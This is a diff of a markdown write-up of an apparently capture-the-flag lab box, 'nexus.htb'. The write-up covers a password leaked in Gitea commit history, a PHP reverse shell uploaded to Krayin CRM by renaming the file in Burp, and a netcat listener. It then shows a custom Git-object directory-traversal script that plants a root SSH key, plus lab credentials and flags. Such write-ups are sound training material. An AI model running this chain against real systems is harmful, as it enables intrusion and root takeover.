@@ -87,17 +87,17 @@ The engagement began with a full-port Nmap scan, which returned only two open se
 
 - **Evidence & Proof of Concept:** Browsing the commit diff directly in the Gitea web UI surfaced the plaintext password:
 
-- ![Exposed DB\_PASSWORD in Gitea commit diff](images/gitea_env_diff.png) *Gitea web interface showing the `.env` commit diff with `DB\_PASSWORD=N27xh!!2ucY04` exposed in cleartext.*
+ ![Exposed DB\_PASSWORD in Gitea commit diff](images/gitea_env_diff.png) *Gitea web interface showing the `.env` commit diff with `DB\_PASSWORD=N27xh!!2ucY04` exposed in cleartext.*
 
 - The same disclosure was confirmed by cloning the repository locally and inspecting the commit log directly:
 
-- ```
+```
 git clone http://git.nexus.htb/admin/krayin-docker-setup.git  
 cd krayin-docker-setup  
 git log -p | grep DB\_PASSWORD
 ```
 
-- ![git log -p output revealing DB\_PASSWORD](images/git_log_password.png) *`git log -p | grep DB\_PASSWORD` confirming the exposed credential directly from the command line.*
+![git log -p output revealing DB\_PASSWORD](images/git_log_password.png) *`git log -p | grep DB\_PASSWORD` confirming the exposed credential directly from the command line.*
 
 
 ### 2. Krayin CRM Unrestricted File Upload (High)
@@ -108,22 +108,22 @@ git log -p | grep DB\_PASSWORD
 
 - **Evidence & Proof of Concept:** Using the [pentestmonkey PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) (IP/port updated to the attacking host), the payload was uploaded as an email attachment and the request intercepted in Burp Suite, where the file extension was changed from `.png` to `.php`:
 
-- ![Burp Suite intercept renaming the upload to .php](images/burp_upload_intercept.png) *Burp Suite proxy intercepting the `POST /admin/tinymce/upload` request, with the filename renamed from `.png` to `.php` before forwarding.*
+![Burp Suite intercept renaming the upload to .php](images/burp_upload_intercept.png) *Burp Suite proxy intercepting the `POST /admin/tinymce/upload` request, with the filename renamed from `.png` to `.php` before forwarding.*
 
 - A Netcat listener was started, and the uploaded webshell path was requested directly to trigger the callback:
 
-- ```
+```
 nc -lnvp 20202  
 curl http://billing.nexus.htb/storage/tinymce/\<hash\>/shell.php
 ```
 
-- ![Burp Suite request triggering the uploaded webshell](images/burp_trigger_request.png) *Follow-up `GET` request to the uploaded webshell path, captured in Burp Suite, used to trigger the reverse shell callback.*
+ ![Burp Suite request triggering the uploaded webshell](images/burp_trigger_request.png) *Follow-up `GET` request to the uploaded webshell path, captured in Burp Suite, used to trigger the reverse shell callback.*
 
-- ![Reverse shell caught on the Netcat listener](images/reverse_shell_caught.png) *Netcat listener catching the reverse shell connection, confirming code execution as `www-data`.*
+![Reverse shell caught on the Netcat listener](images/reverse_shell_caught.png) *Netcat listener catching the reverse shell connection, confirming code execution as `www-data`.*
 
 - Post-exploitation enumeration of the Krayin application directory revealed a **second**, still-valid set of database credentials in the live `.env` file, distinct from the one found in the Gitea commit history:
 
-- ```
+```
 cat /var/www/krayin/.env | grep DB\_PASSWORD
 ```
 
@@ -141,7 +141,7 @@ cat /var/www/krayin/.env | grep DB\_PASSWORD
 
 - A local SSH key pair was generated for the attack, and a new Gitea repository (`rce`) was created and flagged as a **Template**, ensuring it would be picked up by the sync service:
 
-- ```
+```
 ssh-keygen -t ed25519 -f /tmp/.k -N ''  
 git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git  
 cd rce && touch README.md
@@ -149,7 +149,7 @@ cd rce && touch README.md
 
 - The following script constructs raw Git tree/commit objects containing five levels of `../` traversal — enough to escape from `/home/git/template-staging/jones/rce/` up to `/root/` — and writes the generated SSH public key as `authorized\_keys`:
 
-- ```
+```
 \# build.py - crafts raw Git objects with a directory-traversal payload  
 \# Custom PoC script developed for this engagement, targeting the  
 \# unsanitized os.path.join() call in /etc/gitea/template-sync.py  
@@ -198,7 +198,7 @@ print("Done: "+sha)
 
 - The crafted commit was force-pushed to the template repository, and after the sync timer fired, the payload was confirmed in the server-side sync log:
 
-- ```
+```
 python3 /tmp/build.py  
 git push -u origin main --force
 
@@ -211,41 +211,41 @@ Template sync complete
 
 - With the public key now trusted by `root`, authentication was performed directly using the corresponding private key:
 
-- ```
+```
 ssh -i /tmp/root\_key root@10.129.47.24  
 cat /root/root.txt
 ```
 
-- ![Root shell obtained via the SSH key planted by the traversal exploit](images/root_flag.png) *Root shell obtained via `ssh -i /tmp/root\_key root@10.129.47.24`, confirming full privilege escalation and root flag retrieval.*
+![Root shell obtained via the SSH key planted by the traversal exploit](images/root_flag.png) *Root shell obtained via `ssh -i /tmp/root\_key root@10.129.47.24`, confirming full privilege escalation and root flag retrieval.*
 
 
 ## Evidence Appendix
 
 ### Captured Credentials
 
-| Service | Username | Password |
-| - | - | - |
-| Krayin CRM (Initial) | `j.matthew@nexus.htb` | `N27xh!!2ucY04` |
-| SSH (User `jones`) | `jones` | `y27xb3ha!!74GbR` |
+| Service              | Username              | Password          |
+| -------------------- | --------------------- | ----------------- |
+| Krayin CRM (Initial) | `j.matthew@nexus.htb` | `N27xh!!2ucY04`   |
+| SSH (User `jones`)   | `jones`               | `y27xb3ha!!74GbR` |
 
 
 ### Flags Recovered
 
-| Flag Type | Flag Value |
-| - | - |
+| Flag Type     | Flag Value                         |
+| ------------- | ---------------------------------- |
 | **User Flag** | `3290dde5fca195ea451632d54d4b60da` |
 | **Root Flag** | `c25914b5b518500d1c71da5c8331ac9d` |
 
 
 ## MITRE ATT&CK Coverage
 
-| Technique ID | Technique Name | Application |
-| - | - | - |
-| **T1190** | Exploit Public-Facing Application | Exploiting CVE-2026-38526 in Krayin CRM |
-| **T1552.004** | Credentials in Files (Network Configuration) | Extracting credentials from `.env` and Gitea commit history |
-| **T1078.003** | Valid Accounts (Local Accounts) | Using `jones` credentials for SSH access |
-| **T1053.006** | Scheduled Task/Job: Systemd Timers | Abusing `gitea-template-sync.timer` via directory traversal for root privesc |
-| **T1005** | Data from Local System | Extracting user and root flags after each compromise stage |
+| Technique ID  | Technique Name                               | Application                                                                  |
+| ------------- | -------------------------------------------- | ---------------------------------------------------------------------------- |
+| **T1190**     | Exploit Public-Facing Application            | Exploiting CVE-2026-38526 in Krayin CRM                                      |
+| **T1552.004** | Credentials in Files (Network Configuration) | Extracting credentials from `.env` and Gitea commit history                  |
+| **T1078.003** | Valid Accounts (Local Accounts)              | Using `jones` credentials for SSH access                                     |
+| **T1053.006** | Scheduled Task/Job: Systemd Timers           | Abusing `gitea-template-sync.timer` via directory traversal for root privesc |
+| **T1005**     | Data from Local System                       | Extracting user and root flags after each compromise stage                   |
 
 
 
